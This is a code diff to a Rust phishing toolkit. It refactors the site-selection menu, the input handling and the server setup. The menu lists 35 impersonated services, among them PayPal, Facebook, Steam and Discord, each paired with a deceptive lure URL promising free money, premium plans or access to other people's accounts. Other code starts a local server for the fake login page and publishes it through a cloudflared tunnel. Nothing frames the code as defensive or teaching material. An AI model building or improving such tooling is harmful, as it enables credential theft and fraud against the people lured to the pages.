@@ -383,56 +383,57 @@ pub fn site_input() -> Result<u16, TerminalError> {
 
 
 pub fn site_selection<'a>() -> (&'a str, Option<&'a str>) {
-    let selection = match site_input() {
-        Ok(s) => s,
-        Err(e) => {
-            log::error!("Failed to get site input: {}", e);
-            error_msg(&format!("Failed to get site input: {}", e));
-            return ("", None);
-        }
-    };
-    match selection {
-        1 => ("facebook", None),
-        2 => ("instagram", None),
-        3 => ("google", None),
-        4 => ("microsoft", Some("https://unlimited-onedrive-space-for-free")),
-        5 => ("netflix", Some("https://upgrade-your-netflix-plan-free")),
-        6 => ("paypal", Some("https://get-500-usd-free-to-your-acount")),
-        7 => ("steam", Some("https://steam-500-usd-gift-card-free")),
-        8 => ("twitter", Some("https://get-blue-badge-on-twitter-free")),
-        9 => ("playstation", Some("https://playstation-500-usd-gift-card-free")),
-        10 => ("tiktok", Some("https://tiktok-free-liker")),
-        11 => ("twitch", Some("https://unlimited-twitch-tv-user-for-free")),
-        12 => ("pinterest", Some("https://get-a-premium-plan-for-pinterest-free")),
-        13 => ("snapchat", Some("https://view-locked-snapchat-accounts-secretly")),
-        14 => ("linkedin", Some("https://get-a-premium-plan-for-linkedin-free")),
-        15 => ("ebay", Some("https://get-500-usd-free-to-your-acount")),
-        16 => ("quora", Some("https://quora-premium-for-free")),
-        17 => ("protonmail", Some("https://protonmail-pro-basics-for-free")),
-        18 => ("spotify", Some("https://convert-your-account-to-spotify-premium")),
-        19 => ("reddit", Some("https://reddit-official-verified-member-badge")),
-        20 => ("adobe", Some("https://get-adobe-lifetime-pro-membership-free")),
-        21 => ("deviantart", Some("https://get-500-usd-free-to-your-acount")),
-        22 => ("badoo", Some("https://get-500-usd-free-to-your-acount")),
-        23 => ("origin", Some("https://get-500-usd-free-to-your-acount")),
-        24 => ("dropbox", Some("https://get-1TB-cloud-storage-free")),
-        25 => ("yahoo", Some("https://grab-mail-from-anyother-yahoo-account-free")),
-        26 => ("wordpress", Some("https://unlimited-wordpress-traffic-free")),
-        27 => ("yandex", Some("https://grab-mail-from-anyother-yandex-account-free")),
-        28 => ("stackoverflow", Some("https://get-stackoverflow-lifetime-pro-membership-free")),
-        29 => ("vk", None),
-        30 => ("xbox", Some("https://get-500-usd-free-to-your-acount")),
-        31 => ("mediafire", Some("https://get-1TB-on-mediafire-free")),
-        32 => ("gitlab", Some("https://get-1k-followers-on-gitlab-free")),
-        33 => ("github", Some("https://get-1k-followers-on-github-free")),
-        34 => ("discord", Some("https://get-discord-nitro-free")),
-        35 => ("roblox", Some("https://get-free-robux")),
-        99 => ("about", None),
-        0 => ("exit", None),
-        _ => {
-            log::error!("Invalid selection");
-            error_msg("Invalid selection, Please try again");
-            site_selection()
+    loop {
+        let selection = match site_input() {
+            Ok(s) => s,
+            Err(e) => {
+                log::error!("Failed to get site input: {}", e);
+                error_msg(&format!("Failed to get site input: {}", e));
+                return ("", None);
+            }
+        };
+        match selection {
+            1 => return ("facebook", None),
+            2 => return ("instagram", None),
+            3 => return ("google", None),
+            4 => return ("microsoft", Some("https://unlimited-onedrive-space-for-free")),
+            5 => return ("netflix", Some("https://upgrade-your-netflix-plan-free")),
+            6 => return ("paypal", Some("https://get-500-usd-free-to-your-acount")),
+            7 => return ("steam", Some("https://steam-500-usd-gift-card-free")),
+            8 => return ("twitter", Some("https://get-blue-badge-on-twitter-free")),
+            9 => return ("playstation", Some("https://playstation-500-usd-gift-card-free")),
+            10 => return ("tiktok", Some("https://tiktok-free-liker")),
+            11 => return ("twitch", Some("https://unlimited-twitch-tv-user-for-free")),
+            12 => return ("pinterest", Some("https://get-a-premium-plan-for-pinterest-free")),
+            13 => return ("snapchat", Some("https://view-locked-snapchat-accounts-secretly")),
+            14 => return ("linkedin", Some("https://get-a-premium-plan-for-linkedin-free")),
+            15 => return ("ebay", Some("https://get-500-usd-free-to-your-acount")),
+            16 => return ("quora", Some("https://quora-premium-for-free")),
+            17 => return ("protonmail", Some("https://protonmail-pro-basics-for-free")),
+            18 => return ("spotify", Some("https://convert-your-account-to-spotify-premium")),
+            19 => return ("reddit", Some("https://reddit-official-verified-member-badge")),
+            20 => return ("adobe", Some("https://get-adobe-lifetime-pro-membership-free")),
+            21 => return ("deviantart", Some("https://get-500-usd-free-to-your-acount")),
+            22 => return ("badoo", Some("https://get-500-usd-free-to-your-acount")),
+            23 => return ("origin", Some("https://get-500-usd-free-to-your-acount")),
+            24 => return ("dropbox", Some("https://get-1TB-cloud-storage-free")),
+            25 => return ("yahoo", Some("https://grab-mail-from-anyother-yahoo-account-free")),
+            26 => return ("wordpress", Some("https://unlimited-wordpress-traffic-free")),
+            27 => return ("yandex", Some("https://grab-mail-from-anyother-yandex-account-free")),
+            28 => return ("stackoverflow", Some("https://get-stackoverflow-lifetime-pro-membership-free")),
+            29 => return ("vk", None),
+            30 => return ("xbox", Some("https://get-500-usd-free-to-your-acount")),
+            31 => return ("mediafire", Some("https://get-1TB-on-mediafire-free")),
+            32 => return ("gitlab", Some("https://get-1k-followers-on-gitlab-free")),
+            33 => return ("github", Some("https://get-1k-followers-on-github-free")),
+            34 => return ("discord", Some("https://get-discord-nitro-free")),
+            35 => return ("roblox", Some("https://get-free-robux")),
+            99 => return ("about", None),
+            0 => return ("exit", None),
+            _ => {
+                log::error!("Invalid selection");
+                error_msg("Invalid selection, Please try again");
+            }
         }
     }
 }
@@ -475,20 +476,25 @@ pub async fn tunnel_menu(site: &str) -> Result<(), TerminalError> {
 
 
 pub fn get_input_number(msg: &str) -> Result<u32, TerminalError> {
-    print!("{}", msg);
-    stdout().flush()?;
-    let mut input = String::new();
-    stdin().read_line(&mut input)?;
-    match input.trim().parse::<u32>() {
-        Ok(val) => Ok(val),
-        Err(_) => {
-            log::error!("Invalid input");
-            error_msg("Invalid input");
-            get_input_number(msg)
+    loop {
+        print!("{}", msg);
+        stdout().flush()?;
+
+        let mut input = String::new();
+        stdin().read_line(&mut input)?;
+
+        match input.trim().parse::<u32>() {
+            Ok(val) => return Ok(val),
+            Err(_) => {
+                log::error!("Invalid input");
+                error_msg("Invalid input");
+                // continue the loop
+            }
         }
     }
 }
 
+/*
 pub fn get_input_string(msg: &str) -> Result<String, TerminalError> {
     print!("{}", msg);
     stdout().flush()?;
@@ -496,6 +502,7 @@ pub fn get_input_string(msg: &str) -> Result<String, TerminalError> {
     stdin().read_line(&mut input)?;
     Ok(input.trim().to_string())
 }
+*/
 
 pub async fn tunnel_selection(site: &str) -> Result<(), TerminalError> {
     loop {
@@ -517,51 +524,27 @@ pub async fn tunnel_selection(site: &str) -> Result<(), TerminalError> {
 }
 
 
-
 pub async fn setup_site(site: &str) -> Result<(), TerminalError> {
     log::info!("Setting up site");
 
 
+    println!("{} {}", "Setting up server...".green(), "Please wait".cyan());
+    // change into .server directory
+    let sites_dir = get_sites_dir().unwrap_or_else(|| {
+        log::error!("Failed to get sites directory");
+        error_msg("Failed to get sites directory");
+        exit(1);
+    });
+    let site_dir = sites_dir.join(site);
+    dbg!(&sites_dir);
+    dbg!(&site_dir);
 
-    #[cfg(target_os = "windows")]
-    {
-        println!("{} {}", "Setting up server...".green(), "Please wait".cyan());
-        // change into .server directory
-        let sites_dir = get_sites_dir().unwrap_or_else(|| {
-            log::error!("Failed to get sites directory");
-            error_msg("Failed to get sites directory");
-            exit(1);
-        });
-        let site_dir = sites_dir.join(site);
-        dbg!("Changing directory to {:?}", &sites_dir);
-        // env::set_current_dir(&sites_dir)?;
-        dbg!(&site_dir);
+    start_webserver(site_dir).await?;
+    clear_terminal()?;
+    banner_small();
+    println!("{} {}", "Successfully started server at".green(), format!("http://{0}:{1}", HOST, PORT).cyan());
 
-        start_webserver(site_dir).await?;
-        // to do this in rust: cd .server/www && php -S "$HOST":"$PORT" > /dev/null 2>&1 &
-        clear_terminal()?;
-        banner_small();
-        println!("{} {}", "Successfully started server at".green(), format!("http://{0}:{1}", HOST, PORT).cyan());
-    }
-    #[cfg(not(target_os = "windows"))]
-    {
-        println!("{} {}", "Setting up server...".green(), "Please wait".cyan());
-        // change into .server directory
-        let sites_dir = get_sites_dir().unwrap_or_else(|| {
-            log::error!("Failed to get sites directory");
-            error_msg("Failed to get sites directory");
-            exit(1);
-        });
-        env::set_current_dir(sites_dir)?;
 
-        // to do this in rust: cd .server/www && php -S "$HOST":"$PORT" > /dev/null 2>&1 &
-        let mut cmd = Command::new("php");
-        cmd.arg("-S");
-        cmd.arg(format!("{}:{}", HOST, PORT));
-        clear_terminal()?;
-        banner_small();
-        println!("{} {}", "Successfully started server at".green(), format!("http://{0}:{1}", HOST, PORT).cyan());
-    }
     Ok(())
 }
 
@@ -746,6 +729,7 @@ pub async fn start_cloudflared(site: &str) -> Result<(), TerminalError> {
     }
     #[cfg(not(target_os = "windows"))]
     {
+        use std::env::consts::ARCH;
         let cloudflare_file = match ARCH {
             "x86_64" => "cloudflared-linux-amd64",
             "aarch64" => "cloudflared-linux-arm64",
@@ -803,6 +787,7 @@ pub async fn main_menu() -> Result<(), TerminalError> {
     Ok(())
 }
 
+// TODO: Fix clear terminal.
 // TODO: Use Actix-web instead of PHP.
 // TODO: Add LocalXPose Auth.
 // TODO: Add Start with LocalXPose.
